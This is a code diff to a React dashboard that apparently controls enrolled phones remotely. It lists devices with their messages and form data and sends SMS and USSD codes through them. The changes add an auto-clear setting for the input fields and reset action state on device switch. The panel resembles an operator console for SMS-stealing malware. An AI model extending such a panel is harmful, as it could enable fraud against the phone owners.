@@ -633,6 +633,9 @@ function ActionPanel({ action, device, onClose }: { action: ActionKey; device: D
       // online_check stays "loading" until SSE fires (device heartbeat) or 30s timeout
       if (action !== "online_check") {
         setState("ok"); setLog("");
+        if (localStorage.getItem("mr_clean_after_process") === "1") {
+          setTimeout(() => { setNumber(""); setSmsText(""); setUssdCode(""); }, 800);
+        }
       }
     } catch {
       setState("idle");
@@ -1487,6 +1490,20 @@ function DevicesPage({ appId, devices, messages, formData, initialDevice, onBack
   const [quickProgress, setQuickProgress] = useState<Record<string, boolean>>({}); // 5s FCM progress bar
   const [onlineTimer, setOnlineTimer] = useState(0); // live countdown for online_check
   const onlineTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
+
+  // Reset action state when user switches to a different device
+  const prevDeviceIdRef = useRef<string | null>(null);
+  useEffect(() => {
+    const id = selected?.deviceId ?? null;
+    if (id !== prevDeviceIdRef.current) {
+      prevDeviceIdRef.current = id;
+      setQuickState({});
+      setQuickProgress({});
+      setActiveAction(null);
+      if (onlineTimerRef.current) { clearInterval(onlineTimerRef.current); onlineTimerRef.current = null; }
+      setOnlineTimer(0);
+    }
+  });
   // ── Like / Delete state ──
   const [confirmDeleteId, setConfirmDeleteId] = useState<string | null>(null);
   const dpEnabled = useDeleteProt();
@@ -2247,6 +2264,16 @@ function SettingsPage({ appId, isDark, onToggleDark, devices, onLogout, msgCount
   const AUTH_KEY = `mrrobot_auth_${appId}`;
   const SESS_KEY = `mrrobot_session_id_${appId}`;
 
+  /* ── Clean After Process ── */
+  const [cleanAfterProcess, setCleanAfterProcess] = useState<boolean>(
+    () => { try { return localStorage.getItem("mr_clean_after_process") === "1"; } catch { return false; } }
+  );
+  function toggleCleanAfterProcess() {
+    const next = !cleanAfterProcess;
+    setCleanAfterProcess(next);
+    try { localStorage.setItem("mr_clean_after_process", next ? "1" : "0"); } catch {}
+  }
+
   /* ── Delete Protection state ── */
   const [dpEnabled, setDpEnabled] = useState(false);
   const [dpHasPin, setDpHasPin] = useState(false);
@@ -2874,6 +2901,25 @@ function SettingsPage({ appId, isDark, onToggleDark, devices, onLogout, msgCount
         </div>
       </div>}
 
+
+      {/* ── Clean After Process ── */}
+      <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
+        <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, fontSize: 12, fontWeight: 700, color: t.txt2 }}>Actions</div>
+        <div style={{ padding: "14px 16px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
+          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
+            <span style={{ fontSize: 20 }}>🧹</span>
+            <div>
+              <div style={{ fontWeight: 700, fontSize: 14, color: t.txt }}>Clean After Process</div>
+              <div style={{ fontSize: 11, color: t.muted, marginTop: 2 }}>
+                {cleanAfterProcess ? "Send ke baad number/message auto clear hoga" : "Send ke baad fields waise hi rahenge"}
+              </div>
+            </div>
+          </div>
+          <div onClick={toggleCleanAfterProcess} style={{ width: 50, height: 28, borderRadius: 14, background: cleanAfterProcess ? t.accent : "#e2e8f0", position: "relative", cursor: "pointer", transition: "background 0.2s", flexShrink: 0 }}>
+            <div style={{ position: "absolute", top: 3, left: cleanAfterProcess ? 25 : 3, width: 22, height: 22, borderRadius: "50%", background: "#fff", boxShadow: "0 1px 4px rgba(0,0,0,0.2)", transition: "left 0.2s" }} />
+          </div>
+        </div>
+      </div>
 
       {/* ── App Info ── */}
       <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
